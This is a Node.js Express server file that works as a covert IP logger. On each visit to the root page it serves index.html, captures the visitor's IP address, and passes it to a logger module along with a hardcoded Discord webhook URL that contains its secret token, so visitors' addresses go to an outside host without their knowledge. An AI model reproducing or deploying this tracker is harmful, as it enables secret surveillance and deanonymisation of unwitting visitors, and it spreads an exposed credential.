const express = require('express');
const bodyParser = require('body-parser');
const exphbs = require('express-handlebars');
const path = require('path');
const app = express();
const hookcord = require('hookcord');
const Hook = new hookcord.Hook();
const request = require('request');
const Discord = require('discord.js')

app.engine('handlebars', exphbs());
app.set('view engine', 'handlebars');
app.set('trust proxy', true);
app.use(bodyParser.urlencoded({ extended: false}));
app.use(bodyParser.json());

let webhook = "https://discord.com/api/webhooks/776454125336133663/NkJNKWTowmFawGqN99vqS0WmNQwH8PXxyy9j3rOCSthzgiKJldmCnhiHXl8hq0YA6ueh";

app.get('/', (req, res) => {
  var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  let address = ip.split(',')[0];
  res.sendFile("./index.html")
  require('./logger').WebHookFunction(webhook, address);
  
});

app.listen(3000, () => {
  console.log("Page ready.");
  
});
